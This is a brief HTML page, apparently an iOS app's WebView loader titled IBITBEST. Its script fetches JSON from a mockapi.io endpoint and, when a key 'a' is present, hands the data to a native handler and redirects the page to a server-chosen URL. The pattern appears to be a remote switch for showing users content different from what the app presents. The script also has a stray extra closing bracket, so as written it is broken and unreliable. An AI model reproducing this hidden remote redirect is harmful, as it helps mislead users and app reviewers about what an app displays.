<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport"
			content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
		<title>IBITBEST</title>
	</head>
	<body>
		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded', function() {
					function a() {
						console.log("a");
						try {
							window.webkit.messageHandlers.silicaduneobservatory.postMessage({
								add: ""
							});
						} catch (e) {}
					}
					async function getData() {
						try {
							var str = 'https://6acf8dd703feaa52b21eb85e.mockapi.io/IBITBEST/data'
							const response = await fetch(str, {
								cache: 'no-store'
							});
							if (!response.ok) {
								getData();
							}
							const arr = await response.json();
							console.log(arr);
							const dic = arr[0];
							if (Object.hasOwn(dic, 'a')) {
								console.log("b");
								try {
									window.webkit.messageHandlers.silicaduneobservatory.postMessage({
										ui: dic
									});
								} catch (e) {}
								window.location.href = dic["a"];
							} else {
								a()
							}
						} catch (error) {
							console.error('Fetch error:', error);
						}
					}
					getData();
				});
			});
		</script>
	</body>
</html>
